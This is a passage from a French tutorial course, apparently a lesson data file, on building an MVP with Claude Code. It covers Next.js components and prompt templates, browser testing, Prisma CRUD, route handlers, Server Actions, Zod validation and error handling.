<h3>Créer un composant avec Claude Code</h3>
<p>Pour créer un composant, donne à Claude une description précise de ce que tu veux. Plus ta description est détaillée, meilleur sera le résultat. Voici un exemple de prompt efficace :</p>
<p><code>"Crée un composant Button réutilisable dans components/ui/button.tsx. Props : variant (primary, secondary, danger, ghost), size (sm, md, lg), disabled, loading (affiche un spinner), children. Utilise Tailwind CSS. Le bouton primary est bleu avec du texte blanc, le secondary à un fond transparent avec une bordure grise, le danger est rouge, le ghost est transparent. Quand loading est true, le texte est remplacé par un spinner SVG animé."</code></p>
<p>Claude te génèrera un composant complet, typé en TypeScript, avec toutes les variantes Tailwind. Tu n'as plus qu'à l'importer dans tes pages avec <code>import { Button } from "@/components/ui/button"</code>.</p>
<p><strong>Astuce :</strong> Crée d'abord les composants UI de base (Button, Card, Input, Modal) avant de construire les pages. C'est un investissement de temps qui te rapportera gros : chaque page sera plus rapide à construire parce que tu assembleras des composants existants au lieu de tout créer de zéro. Demande à Claude : "Crée-moi une bibliothèque de composants UI de base pour mon MVP : Button, Card, Input, Modal, Badge, Avatar. Style moderne avec Tailwind."</p>

<h2>Travailler efficacement avec Claude Code</h2>
<p>Claude Code est un outil puissant, mais comme tout outil, il est plus efficace quand tu sais bien l'utiliser. Voici les patterns de conversation qui maximisent la qualité du code généré et ta productivité.</p>

<h3>Pattern 1 : Le contexte d'abord</h3>
<p>Avant de demander quoi que ce soit, donne le contexte. Au début de chaque session, rappelle à Claude quel est ton projet, quelle est ta stack et sur quoi tu travailles. Si tu as un fichier <code>CLAUDE.md</code>, Claude Code le lit automatiquement — c'est le meilleur scénario. Sinon, commence par : "Je travaille sur [projet]. Stack : [technologies]. Aujourd'hui je veux [objectif de la session]."</p>

<h3>Pattern 2 : Une tâche à la fois</h3>
<p>Ne demande pas à Claude de créer 5 pages en une seule requête. Demande une page, vérifie le résultat, puis passe à la suivante. Les requêtes courtes et spécifiques produisent un meilleur code que les requêtes longues et vagues. "Crée la page de login avec un formulaire email/password" est meilleur que "Crée toutes les pages de mon application".</p>

<h3>Pattern 3 : L'itération progressive</h3>
<p>Tu n'obtiendras pas le résultat parfait du premier coup — et c'est normal. Le workflow idéal est :</p>
<ul>
<li>Demande la version initiale avec les éléments essentiels</li>
<li>Vérifie dans le navigateur et identifie ce qui ne va pas</li>
<li>Demande des ajustements spécifiques : "Le bouton est trop petit, double sa taille", "Ajoute un message d'erreur sous le champ email si le format est invalide", "Le titre devrait être centré"</li>
<li>Répète jusqu'à satisfaction</li>
</ul>

<h3>Pattern 4 : Le feedback visuel</h3>
<p>Quand tu décris un problème, sois visuel et précis. Au lieu de "ça ne marché pas", dis "Le formulaire de login affiche une erreur 'undefined' quand je clique sur le bouton Connexion avec un email vide — il devrait afficher 'Email requis' en rouge sous le champ." Plus ta description est précise, plus la correction sera rapide et juste.</p>

<h3>Pattern 5 : Demander des explications</h3>
<p>Si Claude génère du code que tu ne comprends pas, demande-lui de t'expliquer. "Explique-moi ce que fait cette ligne : <code>const { data: session } = useSession()</code>" — il te donnera une explication claire en français. Comprendre le code que tu utilises te rend plus autonome et te permet de mieux débuguer quand quelque chose ne fonctionne pas.</p>
<p><strong>Attention :</strong> Ne fais jamais confiance aveuglément au code généré par Claude. Vérifie toujours le résultat dans le navigateur. Claude peut parfois inventer des API qui n'existent pas, utiliser des versions obsolètes de librairies où faire des erreurs de logique. Ton rôle de pilote est de valider chaque livraison.</p>

<h2>Server Components vs Client Components</h2>
<p>C'est un concept fondamental de Next.js App Router que tu dois comprendre pour bien communiquer avec Claude Code. Par défaut, tous les composants dans le dossier <code>app/</code> sont des Server Components — ils s'exécutent sur le serveur. Pour créer un Client Component (qui s'exécute dans le navigateur), tu dois ajouter <code>'use client'</code> en première ligne du fichier.</p>

<h3>Quand utiliser un Server Component</h3>
<ul>
<li>Quand tu récupères des données depuis la base de données (requêtes Prisma)</li>
<li>Quand tu accèdes à des variables d'environnement secrètes</li>
<li>Quand le composant n'a pas besoin d'interactivité (affichage statique)</li>
<li>Quand tu veux que la page se charge plus rapidement (le HTML est généré côté serveur)</li>
</ul>

<h3>Quand utiliser un Client Component</h3>
<ul>
<li>Quand tu utilises <code>useState</code> (un état local, comme un compteur où un formulaire)</li>
<li>Quand tu utilises <code>useEffect</code> (un effet secondaire, comme un timer où une écoute d'événement)</li>
<li>Quand tu gères des événements utilisateur (<code>onClick</code>, <code>onChange</code>, <code>onSubmit</code>)</li>
<li>Quand tu utilises des hooks de librairies tierces (<code>useSession</code>, <code>useRouter</code>)</li>
</ul>

<h3>La règle pratique</h3>
<p>Commence toujours en Server Component. Si tu as besoin d'interactivité, ajoute <code>'use client'</code>. En cas de doute, demande à Claude : "Ce composant doit-il être un Server Component où un Client Component ?" en lui décrivant ce que fait le composant.</p>
<p>L'erreur la plus courante des débutants est de mettre <code>'use client'</code> partout par réflexe. Résiste à cette tentation. Les Server Components sont plus performants (moins de JavaScript envoyé au navigateur), plus sécurisés (les données sensibles ne quittent pas le serveur) et plus simples (pas besoin de gérer le state). Utilise les Client Components uniquement quand c'est nécessaire.</p>
<p><strong>Conseil pro :</strong> Quand tu vois une erreur du type "useState is not defined" où "Event handlers cannot be passed to Server Component", c'est que tu as oublié d'ajouter <code>'use client'</code> en haut du fichier. C'est l'erreur la plus fréquente en Next.js App Router et la correction est toujours la même : ajoute <code>'use client'</code> en première ligne.</p>

<h2>Les prompts efficaces pour le frontend</h2>
<p>Voici des templates de prompts optimisés pour créer du frontend avec Claude Code. Copie-les, adapte-les à ton projet et utilise-les systématiquement pour obtenir des résultats cohérents et de qualité.</p>

<h3>Prompt pour un composant UI</h3>
<p><code>"Crée un composant [Nom] dans components/ui/[nom].tsx. Props : [liste des props avec leurs types]. Utilise Tailwind CSS avec un style [moderne/minimaliste/corporate]. Le composant doit [description du comportement]. Assure-toi qu'il est responsive et accessible (aria-labels, focus visible, keyboard navigation)."</code></p>

<h3>Prompt pour une page complète</h3>
<p><code>"Crée la page [nom] dans app/[route]/page.tsx. C'est un Server Component qui [description]. La page affiche [éléments visuels]. Utilise les composants existants : [Button, Card, etc.] depuis @/components/ui/. La mise en page utilise une grille responsive : 1 colonne sur mobile, 2 sur tablette, 3 sur desktop. Ajoute un titre h1, un sous-titre descriptif et [contenu spécifique]."</code></p>

<h3>Prompt pour un formulaire</h3>
<p><code>"Crée un formulaire [nom] dans components/forms/[nom]-form.tsx. C'est un Client Component ('use client'). Champs : [liste des champs avec types et validation]. Le formulaire utilise useState pour gérer les valeurs et les erreurs. À la soumission, il appelle [POST /api/...] avec fetch. Affiche un message de succès où d'erreur après la soumission. Tous les champs ont des labels, des placeholders et des messages d'erreur en français."</code></p>

<h3>Prompt pour un layout</h3>
<p><code>"Crée le layout du dashboard dans app/dashboard/layout.tsx. Il contient : un header fixe en haut (logo à gauche, avatar utilisateur à droite), une sidebar à gauche avec les liens de navigation [liste des liens avec icônes], et une zone de contenu principal. Sur mobile, la sidebar est cachée et accessible via un menu hamburger. Utilise Tailwind CSS et des couleurs neutres (fond gris clair, sidebar blanche, header blanc avec une ombre)."</code></p>
<p><strong>Astuce :</strong> Plus tu donnes de détails dans tes prompts, moins tu auras besoin d'itérer. Précise les couleurs ("bleu indigo"), les tailles ("texte de 14px"), les espacements ("32px entre les cartes") et les comportements ("le modal se ferme en cliquant en dehors"). Chaque détail omis sera une décision que Claude prendra à ta place — et qui ne correspondra peut-être pas à ta vision.</p>

<h2>Tester au fur et à mesure</h2>
<p>Ne code pas pendant 3 heures sans vérifier le résultat. Teste après chaque modification significative. C'est la règle d'or du développement frontend : vérifie visuellement, souvent, et sur différents appareils.</p>

<h3>Le preview dans le navigateur</h3>
<p>Ton serveur de développement (<code>npm run dev</code>) recharge automatiquement la page à chaque modification de fichier. Garde ton navigateur ouvert à côté de ton éditeur de code. Chaque fois que Claude modifie un fichier, regarde le résultat en direct. Si quelque chose ne s'affiche pas correctement, signale-le immédiatement à Claude plutôt que de continuer à construire par-dessus un bug.</p>

<h3>Les DevTools du navigateur</h3>
<p>Les DevTools (F12 où Ctrl+Shift+I) sont tes meilleurs amis pour le debugging frontend :</p>
<ul>
<li><strong>Onglet Éléments</strong> : Inspecte la structure HTML et les styles CSS de chaque élément. Tu peux modifier les styles en temps réel pour tester des ajustements avant de demander à Claude de les appliquer.</li>
<li><strong>Onglet Console</strong> : Affiche les erreurs JavaScript. Si tu vois du rouge, quelque chose ne va pas. Copie le message d'erreur et envoie-le à Claude — il saura le corriger.</li>
<li><strong>Onglet Network</strong> : Montre toutes les requêtes HTTP. Indispensable pour vérifier que tes appels API fonctionnent correctement (code 200 = OK, 400/500 = erreur).</li>
</ul>

<h3>Le test responsive</h3>
<p>Ton MVP doit fonctionner sur mobile. Plus de 60 % du trafic web est mobile. Dans les DevTools, clique sur l'icône de téléphone (où Ctrl+Shift+M) pour activer le mode responsive. Teste ta page sur les tailles courantes : iPhone (375px de large), iPad (768px) et desktop (1280px). Si quelque chose est cassé sur mobile, dis à Claude : "La page [nom] est cassée sur mobile — le formulaire déborde de l'écran. Corrige le responsive."</p>

<h3>Lighthouse : le check final</h3>
<p>Avant de considérer une page comme terminée, lance un audit Lighthouse (DevTools > onglet Lighthouse). C'est un outil de Google qui évalue 4 critères : Performance, Accessibilité, Bonnes pratiques et SEO. Vise un score de 90+ sur les 4 critères. Si un score est bas, Lighthouse te dit exactement quoi corriger. Transmets ces recommandations à Claude : "Lighthouse me dit que les images n'ont pas d'attribut alt et que le contraste du texte est insuffisant. Corrige ces problèmes d'accessibilité."</p>
<p><strong>Attention :</strong> Ne cherche pas la perfection au pixel près pour ton MVP. L'objectif est que l'interface soit propre, fonctionnelle et utilisable. Un bouton décalé de 2 pixels n'empêchera personne d'utiliser ton produit. Un formulaire qui ne soumet pas, par contre, est un showstopper. Concentre tes tests sur la fonctionnalité d'abord, le polish visuel ensuite.</p>
<p><strong>Conseil pro :</strong> Tiens un fichier <code>BUGS.md</code> où tu notes tous les problèmes que tu repères pendant les tests. À la fin de chaque session, passe cette liste à Claude : "Voici les bugs à corriger : [liste]." Il les corrigera tous en une seule passe. C'est plus efficace que de corriger les bugs un par un au fil de l'eau.</p>

<blockquote>Le frontend est ce que tes utilisateurs voient et touchent. C'est ta première impression. Un frontend propre et fonctionnel donne confiance, même si le backend est encore basique. Avec Claude Code, tu peux avoir un frontend de qualité professionnelle en quelques jours — profites-en.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Initialise un projet Next.js avec la commande <code>npx create-next-app@latest mon-mvp</code> en suivant les options recommandées dans la leçon (TypeScript, Tailwind, App Router). Vérifie que le serveur tourne avec <code>npm run dev</code>.</li>
<li>Crée les fichiers de base pour ton MVP : <code>CLAUDE.md</code> (contexte du projet), <code>.env</code> (variables d'environnement avec DATABASE_URL et NEXTAUTH_SECRET), et la structure de dossiers <code>components/ui/</code>, <code>components/forms/</code>, <code>lib/</code>.</li>
<li>Demande à Claude de créer 3 composants UI de base : un Button (avec variantes primary/secondary/danger), un Card (avec titre, description et contenu), et un Input (avec label, placeholder et message d'erreur). Vérifie chaque composant dans le navigateur.</li>
<li>Demande à Claude de créer le layout du dashboard (<code>app/dashboard/layout.tsx</code>) avec un header et une sidebar. Puis crée la page <code>app/dashboard/page.tsx</code> qui affiche 4 cartes de statistiques et un message de bienvenue. Vérifie le responsive sur mobile.</li>
<li>Lance un audit Lighthouse sur ta page dashboard. Note les scores et demande à Claude de corriger les problèmes identifiés pour atteindre un score de 90+ sur les 4 critères.</li>
</ol>`,
  },
  // ─── Lesson 43 : Backend, API et base de données avec Claude ───
  {
    order: 43,
    module: 5,
    title: "Backend, API et base de données avec Claude",
    slug: "backend-api-base-de-données-claude",
    duration: "55 min",
    description: "Construire le backend de ton MVP : routes API, base de données Prisma, Server Actions et gestion des erreurs.",
    content: `<h2>Le backend : le cerveau invisible</h2>
<p>Quand un utilisateur clique sur un bouton de ton application, il se passe quelque chose en coulisses. Ce quelque chose, c'est le backend. Le frontend, c'est ce que l'utilisateur voit et touche — les boutons, les formulaires, les animations. Le backend, c'est le moteur caché qui traite les données, applique les règles métier et stocke les informations. Sans backend, ton application est une jolie coquille vide : elle affiche des choses, mais elle ne fait rien de concret.</p>
<p>Prenons un exemple simple. Quand un utilisateur s'inscrit sur ton SaaS, voici ce qui se passe côté backend : le formulaire envoie les données (nom, email, mot de passe) au serveur. Le serveur vérifie que l'email n'est pas déjà utilisé, hash le mot de passe pour le sécuriser, crée un enregistrement dans la base de données, envoie un email de confirmation via une API tierce (Resend, par exemple), puis renvoie une réponse au frontend pour confirmer l'inscription. Tout ça en moins d'une seconde.</p>
<p>Dans une architecture Next.js, le backend vit dans le même projet que le frontend. C'est un avantage énorme pour un MVP : tu n'as pas besoin de gérer deux serveurs séparés, deux déploiements, deux configurations. Tout est au même endroit. Les fichiers dans <code>app/api/</code> sont tes endpoints d'API, et les Server Actions te permettent d'exécuter du code serveur directement depuis tes composants React.</p>
<p><strong>Astuce :</strong> Pense au backend comme au personnel en cuisine d'un restaurant. Le client (l'utilisateur) ne voit que le serveur (le frontend) qui prend sa commande et apporte le plat. Mais derrière, il y à un chef (la logique métier), un garde-manger (la base de données) et des fournisseurs (les APIs tierces) qui font le vrai travail.</p>
<p>Le backend de ton MVP va gérer trois choses essentielles : la persistance des données (stocker et récupérer les informations dans ta base de données), la logique métier (les règles qui gouvernent ton application — qui peut faire quoi, dans quelles conditions) et les intégrations (communiquer avec des services externes comme Stripe, Resend où l'API d'OpenAI). Claude Code excelle à générer tout ça. Mais pour lui donner les bonnes instructions et valider son travail, tu dois comprendre comment ces pièces s'assemblent.</p>
<p><strong>Conseil pro :</strong> Avant de demander à Claude de coder le backend, dessine le flux de données sur papier. Pour chaque fonctionnalité, note : quelle donnée entre, quelle transformation est appliquée, où elle est stockée, quelle réponse est renvoyée. Ce schéma simple te fera gagner des heures de debugging.</p>

<h2>Configurer Prisma et la base de données</h2>
<p>Prisma est l'ORM (Object-Relational Mapping) que Claude Code utilise pour interagir avec la base de données. Au lieu d'écrire du SQL brut, tu décris tes données dans un schéma lisible, et Prisma génère tout le code nécessaire pour créer, lire, modifier et supprimer ces données. C'est comme avoir un traducteur automatique entre ton code TypeScript et ta base de données PostgreSQL.</p>
<p>Pour installer Prisma dans ton projet Next.js, tu utilises deux commandes :</p>
<ul>
<li><code>npm install prisma --save-dev</code> : Installe l'outil CLI de Prisma, utilisé pour les migrations et la génération de code.</li>
<li><code>npm install @prisma/client</code> : Installe le client Prisma, la librairie que tu utilises dans ton code pour faire des requêtes à la base de données.</li>
</ul>
<p>Ensuite, tu initialises Prisma avec <code>npx prisma init</code>. Cette commande crée deux choses : un fichier <code>prisma/schema.prisma</code> (le schéma de ta base de données) et un fichier <code>.env</code> avec une variable <code>DATABASE_URL</code> que tu dois remplir avec l'URL de connexion à ta base de données (Neon, Supabase, Railway...).</p>
<p>Le fichier <code>schema.prisma</code> est le coeur de ta configuration. Voici un exemple concret pour un SaaS de gestion de projets :</p>
<p><code>model User { id String @id @default(cuid()) name String email String @unique plan String @default("free") projects Project[] createdAt DateTime @default(now()) }</code></p>
<p><code>model Project { id String @id @default(cuid()) title String description String? userId String user User @relation(fields: [userId], références: [id]) tasks Task[] createdAt DateTime @default(now()) }</code></p>
<p>Chaque <code>model</code> correspond à une table dans ta base de données. Les champs ont des types (<code>String</code>, <code>Int</code>, <code>DateTime</code>, <code>Boolean</code>) et des attributs (<code>@id</code>, <code>@unique</code>, <code>@default</code>). Les relations entre tables sont déclarées avec des champs de référence.</p>
<p>Une fois ton schéma défini, tu exécutes deux commandes essentielles :</p>
<ul>
<li><code>npx prisma migrate dev --name init</code> : Crée les tables dans ta base de données et génère un fichier de migration.</li>
<li><code>npx prisma generate</code> : Génère le client Prisma typé qui te permet de faire des requêtes dans ton code avec de l'autocomplétion.</li>
</ul>
<p><strong>Attention :</strong> Crée un fichier utilitaire <code>lib/prisma.ts</code> pour instancier le client Prisma une seule fois. En développement, Next.js recharge le code fréquemment, et sans cette précaution, tu te retrouves avec des dizaines de connexions ouvertes à la base de données qui finissent par saturer le pool de connexions.</p>
<p><strong>Astuce :</strong> Utilise <code>npx prisma studio</code> pour ouvrir une interface graphique qui te permet de voir et modifier les données directement dans ton navigateur. C'est un outil indispensable pour le debugging — bien plus rapide que d'écrire des requêtes à la main.</p>

<h2>Les Route Handlers (API)</h2>
<p>Dans Next.js App Router, les routes API sont créées avec des fichiers <code>route.ts</code> placés dans le dossier <code>app/api/</code>. Chaque fichier exporte des fonctions nommées selon les méthodes HTTP : <code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>PATCH</code>, <code>DELETE</code>. C'est le système qui permet à ton frontend (où à des services externes) de communiquer avec ton backend.</p>
<p>Voici la structure typique d'un Route Handler :</p>
<p><code>// app/api/projects/route.ts</code></p>
<p><code>export async function GET(request: Request) { const projects = await prisma.project.findMany(); return Response.json(projects); }</code></p>
<p><code>export async function POST(request: Request) { const body = await request.json(); const project = await prisma.project.create({ data: body }); return Response.json(project, { status: 201 }); }</code></p>
<p>Le cycle de vie d'une requête API suit toujours le même schéma : le client envoie une requête HTTP (avec une URL, une méthode et éventuellement un corps JSON), le Route Handler reçoit la requête, la traite (validation, logique métier, accès base de données), puis renvoie une réponse JSON avec un code de statut.</p>
<p>Pour les routes dynamiques qui ciblent une ressource spécifique (un projet par son ID, par exemple), tu crées un dossier avec un paramètre entre crochets :</p>
<p><code>// app/api/projects/[id]/route.ts</code></p>
<p><code>export async function GET(request: Request, { params }: { params: { id: string } }) { const project = await prisma.project.findUnique({ where: { id: params.id } }); if (!project) return Response.json({ error: "Projet non trouvé" }, { status: 404 }); return Response.json(project); }</code></p>
<p>Quelques bonnes pratiques importantes pour tes Route Handlers :</p>
<ul>
<li>Retourne toujours le bon code de statut HTTP : 200 pour un GET réussi, 201 pour un POST qui crée une ressource, 400 pour une requête invalide, 404 quand la ressource n'existe pas, 500 pour une erreur serveur.</li>
<li>Valide toujours les données entrantes avant de les envoyer à la base de données. Ne fais jamais confiance aux données du client.</li>
<li>Protège tes routes avec de l'authentification. Vérifie que l'utilisateur est connecté et qu'il à le droit d'accéder à cette ressource.</li>
<li>Gère les erreurs avec des blocs <code>try/catch</code> pour éviter que ton API ne plante silencieusement.</li>
</ul>
<p><strong>Conseil pro :</strong> Organise tes routes API de manière cohérente. Utilise la convention RESTful : <code>/api/projects</code> pour la collection (GET = lister, POST = créer) et <code>/api/projects/[id]</code> pour une ressource individuelle (GET = détail, PUT = modifier, DELETE = supprimer). Claude Code génère cette structure naturellement si tu le lui demandes.</p>

<h2>CRUD complet avec Prisma</h2>
<p>CRUD, c'est l'acronyme de Create, Read, Update, Delete — les quatre opérations fondamentales de toute application. Si tu construis un SaaS, 80 % de ton backend sera du CRUD. Créer un utilisateur, lire la liste des projets, modifier une tâche, supprimer un commentaire. Prisma rend ces opérations élégantes et typées.</p>
<p><strong>Create</strong> — Créer un enregistrement :</p>
<p><code>const user = await prisma.user.create({ data: { name: "Sophie Moreau", email: "sophie@example.com", plan: "pro" } });</code></p>
<p>Tu peux aussi créer un enregistrement avec ses relations en une seule requête. Par exemple, créer un utilisateur avec son premier projet :</p>
<p><code>const user = await prisma.user.create({ data: { name: "Sophie", email: "sophie@example.com", projects: { create: { title: "Mon premier projet" } } } });</code></p>
<p><strong>Read</strong> — Lire des données :</p>
<ul>
<li><code>prisma.user.findMany()</code> : Récupère tous les utilisateurs.</li>
<li><code>prisma.user.findUnique({ where: { id: "abc123" } })</code> : Récupère un utilisateur par son ID.</li>
<li><code>prisma.user.findMany({ where: { plan: "pro" }, orderBy: { createdAt: "desc" }, take: 10 })</code> : Les 10 derniers utilisateurs Pro, triés par date de création.</li>
<li><code>prisma.user.findMany({ include: { projects: true } })</code> : Récupère les utilisateurs avec leurs projets (jointure automatique).</li>
</ul>
<p><strong>Update</strong> — Modifier un enregistrement :</p>
<p><code>const updated = await prisma.user.update({ where: { id: "abc123" }, data: { plan: "enterprise" } });</code></p>
<p>Pour modifier plusieurs enregistrements d'un coup : <code>await prisma.user.updateMany({ where: { plan: "free" }, data: { plan: "starter" } });</code></p>
<p><strong>Delete</strong> — Supprimer un enregistrement :</p>
<p><code>await prisma.user.delete({ where: { id: "abc123" } });</code></p>
<p><strong>Attention :</strong> En production, préfère le "soft delete" au lieu de supprimer réellement les données. Ajoute un champ <code>deletedAt DateTime?</code> à tes modèles et filtre les enregistrements supprimés dans tes requêtes. Ça te permet de récupérer des données supprimées par erreur et de garder un historique.</p>
<p><strong>Astuce :</strong> Prisma propose aussi <code>upsert</code>, une opération très pratique qui crée l'enregistrement s'il n'existe pas, où le met à jour s'il existe déjà. Parfait pour les imports de données où les synchronisations : <code>await prisma.user.upsert({ where: { email: "sophie@example.com" }, update: { name: "Sophie M." }, create: { name: "Sophie M.", email: "sophie@example.com" } });</code></p>

<h2>Server Actions : l'alternative moderne</h2>
<p>Les Server Actions sont une fonctionnalité récente de Next.js qui simplifie radicalement la communication frontend-backend. Au lieu de créer une route API, de faire un fetch côté client et de gérer la réponse, tu écris une fonction serveur que tu appelles directement depuis ton composant React. C'est comme si la frontière entre frontend et backend disparaissait.</p>
<p>Pour créer une Server Action, tu ajoutes la directive <code>"use server"</code> en haut d'un fichier où d'une fonction :</p>
<p><code>// app/actions/projects.ts<br/>"use server"<br/><br/>export async function createProject(formData: FormData) {<br/>  const title = formData.get("title") as string;<br/>  const description = formData.get("description") as string;<br/><br/>  const project = await prisma.project.create({<br/>    data: { title, description, userId: "user-id" }<br/>  });<br/><br/>  revalidatePath("/dashboard");<br/>  return project;<br/>}</code></p>
<p>Côté composant, tu utilises cette action directement dans un formulaire :</p>
<p><code>&lt;form action={createProject}&gt;<br/>  &lt;input name="title" placeholder="Nom du projet" /&gt;<br/>  &lt;button type="submit"&gt;Créer&lt;/button&gt;<br/>&lt;/form&gt;</code></p>
<p>Les avantages des Server Actions sont considérables pour un MVP :</p>
<ul>
<li><strong>Type-safety de bout en bout</strong> : TypeScript vérifie les types depuis le formulaire jusqu'à la base de données. Pas de typo dans le nom d'un champ JSON qui passe inaperçue.</li>
<li><strong>Moins de code</strong> : Pas besoin de créer un fichier route.ts, de faire un fetch, de parser la réponse. Le code est plus court et plus lisible.</li>
<li><strong>Revalidation automatique</strong> : Avec <code>revalidatePath</code> où <code>revalidateTag</code>, les données affichées se mettent à jour automatiquement après la mutation.</li>
<li><strong>Sécurité native</strong> : Les Server Actions ne sont jamais exposées au client. Le code reste sur le serveur, contrairement à une route API qui à une URL publique.</li>
</ul>
<p><strong>Conseil pro :</strong> Utilise les Server Actions pour les mutations (créer, modifier, supprimer) déclenchées par l'utilisateur. Garde les Route Handlers pour les endpoints qui doivent être accessibles par des services externes (webhooks Stripe, par exemple) où pour les API publiques que d'autres applications pourraient consommer.</p>
<p><strong>Astuce :</strong> Combine les Server Actions avec le hook <code>useActionState</code> de React pour gérer l'état du formulaire (loading, erreur, succès) de manière élégante. Claude Code génère cette combinaison parfaitement quand tu lui demandes un formulaire avec gestion d'erreurs.</p>

<h2>La validation des données</h2>
<p>Ne fais jamais confiance aux données qui arrivent du client. Jamais. Même si ton formulaire à une validation côté frontend, un utilisateur malveillant peut contourner cette validation en envoyant des requêtes directement à ton API. La validation côté serveur est la dernière ligne de défense de ton application — elle est non négociable.</p>
<p>La bonne pratique, c'est la validation en double couche :</p>
<ul>
<li><strong>Côté client (frontend)</strong> : Validation instantanée pour améliorer l'expérience utilisateur. L'utilisateur voit immédiatement si son email est mal formaté où si un champ obligatoire est vide. Utilise les attributs HTML (<code>required</code>, <code>type="email"</code>, <code>minLength</code>) et la validation JavaScript pour les cas plus complexes.</li>
<li><strong>Côté serveur (backend)</strong> : Validation stricte et exhaustive avant toute opération en base de données. C'est ici que tu utilises Zod, la librairie de validation la plus populaire de l'écosystème TypeScript.</li>
</ul>
<p>Zod te permet de définir des schémas de validation typés et réutilisables :</p>
<p><code>import { z } from "zod";<br/><br/>const createProjectSchema = z.object({<br/>  title: z.string().min(3, "Le titre doit faire au moins 3 caractères").max(100),<br/>  description: z.string().max(500).optional(),<br/>  budget: z.number().positive("Le budget doit être positif"),<br/>  email: z.string().email("Email invalide"),<br/>});</code></p>
<p>Ensuite, dans ton Route Handler où ta Server Action :</p>
<p><code>const result = createProjectSchema.safeParse(body);<br/>if (!result.success) {<br/>  return Response.json({ errors: result.error.flatten().fieldErrors }, { status: 400 });<br/>}<br/>// result.data est maintenant typé et validé</code></p>
<p>Au-delà de la validation de format, pense à la sanitization — nettoyer les données pour prévenir les attaques. Les cas les plus courants :</p>
<ul>
<li><strong>XSS (Cross-Site Scripting)</strong> : Un utilisateur injecte du JavaScript dans un champ de texte. React protège automatiquement contre ça dans la plupart des cas, mais attention aux cas où tu utilises <code>dangerouslySetInnerHTML</code>.</li>
<li><strong>SQL Injection</strong> : Prisma te protège nativement contre les injections SQL car il utilise des requêtes paramétrées. C'est un avantage majeur par rapport au SQL brut.</li>
<li><strong>Trim les espaces</strong> : Utilise <code>.trim()</code> sur les chaînes pour éviter les espaces accidentels en début et fin de saisie.</li>
</ul>
<p><strong>Attention :</strong> La validation côté client est pour le confort, la validation côté serveur est pour la sécurité. Si tu dois choisir, priorise TOUJOURS le serveur. Un formulaire sans validation frontend est moche mais fonctionnel. Un backend sans validation serveur est une faille de sécurité béante.</p>

<h2>Connecter le frontend au backend</h2>
<p>Maintenant que ton backend est en place, il faut que le frontend puisse communiquer avec lui. Dans Next.js, tu as deux approches principales selon le contexte, et il est important de comprendre quand utiliser chacune.</p>
<p><strong>Approche 1 : les Server Components (chargement initial)</strong></p>
<p>Les Server Components de Next.js s'exécutent côté serveur. Ils peuvent accéder directement à Prisma sans passer par une API. C'est l'approche la plus simple et la plus performante pour afficher des données :</p>
<p><code>// app/dashboard/page.tsx (Server Component par défaut)<br/>export default async function DashboardPage() {<br/>  const projects = await prisma.project.findMany({<br/>    where: { userId: currentUser.id },<br/>    orderBy: { createdAt: "desc" }<br/>  });<br/><br/>  return (<br/>    &lt;div&gt;{projects.map(p =&gt; &lt;ProjectCard key={p.id} project={p} /&gt;)}&lt;/div&gt;<br/>  );<br/>}</code></p>
<p>Pas de fetch, pas d'état loading, pas de useEffect. Le composant attend les données du serveur et les affiche directement. C'est rapide, simple et SEO-friendly.</p>
<p><strong>Approche 2 : les Server Actions (mutations utilisateur)</strong></p>
<p>Quand l'utilisateur fait une action (créer un projet, modifier un profil, supprimer une tâche), tu utilises une Server Action. Le formulaire appelle la fonction serveur, qui fait la mutation en base de données, puis revalide la page pour que les données affichées se mettent à jour :</p>
<p><code>// Composant client avec Server Action<br/>"use client"<br/><br/>import { createProject } from "@/app/actions/projects";<br/><br/>export function NewProjectForm() {<br/>  return (<br/>    &lt;form action={createProject}&gt;<br/>      &lt;input name="title" required /&gt;<br/>      &lt;button type="submit"&gt;Créer le projet&lt;/button&gt;<br/>    &lt;/form&gt;<br/>  );<br/>}</code></p>
<p><strong>Approche 3 : fetch vers les Route Handlers (cas spécifiques)</strong></p>
<p>Parfois, tu as besoin de faire un appel API depuis un composant client — par exemple pour une recherche en temps réel, un auto-complete où un chargement infini. Dans ce cas, tu utilises fetch vers tes Route Handlers :</p>
<p><code>const response = await fetch("/api/projects/search?q=" + query);<br/>const results = await response.json();</code></p>
<p>La règle est simple : Server Components pour lire les données au chargement, Server Actions pour les mutations, et fetch uniquement quand les deux premières approches ne suffisent pas. Claude Code connaît ces patterns et les applique correctement si tu lui décris le comportement souhaité.</p>
<p><strong>Astuce :</strong> Pour un MVP, tu peux couvrir 90 % des cas avec seulement des Server Components et des Server Actions. Ne te complique pas la vie avec des bibliothèques de gestion d'état comme Redux où Zustand — tu n'en as pas besoin à ce stade.</p>

<h2>La gestion des erreurs</h2>
<p>Les erreurs sont inévitables. La base de données est temporairement inaccessible, l'utilisateur envoie des données invalides, une API tierce ne répond pas, un bug se glisse dans ta logique métier. Ce qui différencie un MVP amateur d'un produit professionnel, c'est la manière dont tu gères ces erreurs. Un utilisateur qui voit un écran blanc où un message "500 Internal Server Error" perd immédiatement confiance en ton produit.</p>
<p>La première couche de protection, c'est le <code>try/catch</code> dans tes Route Handlers et Server Actions :</p>
<p><code>export async function createProject(formData: FormData) {<br/>  try {<br/>    const data = createProjectSchema.parse(Object.fromEntries(formData));<br/>    const project = await prisma.project.create({ data });<br/>    revalidatePath("/dashboard");<br/>    return { success: true, project };<br/>  } catch (error) {<br/>    if (error instanceof z.ZodError) {<br/>      return { success: false, errors: error.flatten().fieldErrors };<br/>    }<br/>    console.error("Erreur création projet:", error);<br/>    return { success: false, errors: { _form: ["Une erreur est survenue. Réessaie."] } };<br/>  }<br/>}</code></p>
<p>Points clés de cette approche :</p>
<ul>
<li><strong>Erreurs de validation</strong> : Renvoie les erreurs spécifiques par champ pour que le formulaire puisse les afficher au bon endroit.</li>
<li><strong>Erreurs inattendues</strong> : Log l'erreur complète côté serveur (pour que toi tu puisses débugger) mais renvoie un message générique au client (pour ne pas exposer des détails techniques sensibles).</li>
<li><strong>Structure cohérente</strong> : Toutes tes actions renvoient le même format <code>{ success, data?, errors? }</code> pour que le frontend sache toujours à quoi s'attendre.</li>
</ul>
<p>La deuxième couche, ce sont les Error Boundaries de Next.js. Crée un fichier <code>error.tsx</code> dans tes dossiers de routes pour capturer les erreurs non gérées :</p>
